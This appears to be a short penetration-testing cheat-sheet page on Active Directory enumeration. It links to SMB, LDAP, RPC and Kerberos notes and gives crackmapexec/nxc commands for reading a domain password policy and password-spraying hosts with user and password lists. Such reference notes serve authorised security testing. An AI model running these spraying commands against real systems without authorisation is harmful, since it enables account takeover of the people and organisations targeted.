# Enumeration

#### Parse SMB Shares [smb-139-445.md](../enumeration/smb-139-445.md "mention")

#### LDAP Enumeration [ldap-ldaps-389-636.md](../enumeration/ldap-ldaps-389-636.md "mention")

#### RPC Enumeration [rpc-135.md](../enumeration/rpc-135.md "mention")

#### Kerbose Enumeration [kerberos-88.md](../enumeration/kerberos-88.md "mention")

#### Password Spraying

* Understand Password Policy

{% code lineNumbers="true" %}
```
crackmapexec smb <dc-ip> --pass-pol
nxc smb <dc-ip> --pass-pol
```
{% endcode %}

* [Password Policy Guide](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/hh994562\(v=ws.11\))

{% code lineNumbers="true" %}
```
crackmapexec smb <target-ips> -u users.txt -p passwords.txt -d <domain>  //use --local-auth
nxc smb <target-ips> -u users.txt -p passwords.txt -d <domain>  //use --local-auth
```
{% endcode %}
